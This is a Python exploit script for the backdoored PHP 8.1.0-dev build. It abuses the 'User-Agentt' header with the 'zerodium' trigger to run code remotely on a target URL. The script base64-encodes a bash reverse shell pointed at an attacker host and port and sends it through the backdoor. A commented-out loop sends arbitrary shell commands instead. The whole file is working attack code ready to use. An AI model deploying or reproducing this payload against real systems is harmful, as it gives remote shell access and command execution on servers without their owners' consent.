#PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
# References:
#   - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
#   - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md


import sys
import urllib, requests
import base64

if len(sys.argv) != 4 or sys.argv[1] in ['-h', '--help']:
    print("Exploit backdoor PHP 8.1.0-dev")
    print("Please start netcat listener on LPORT")
    print("usage :", sys.argv[0], "URL LHOST LPORT")
    exit(2)
else:
    url = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]

    revshell = base64.b64encode(("bash -i >& /dev/tcp/"+lhost+"/"+lport+" 0>&1").encode()).decode()
    r = requests.get(url, headers={'User-Agentt': "zerodiumsystem('echo "+ revshell +" | base64 -d | bash'); die;?>"})

    """
    or just launch single commands
    while 1:

        cmd = input('cmd: ')
        r = requests.get(url, headers={'User-Agentt': "zerodiumsystem('" + cmd + "'); die;?>"})
        print(r.text)
    """
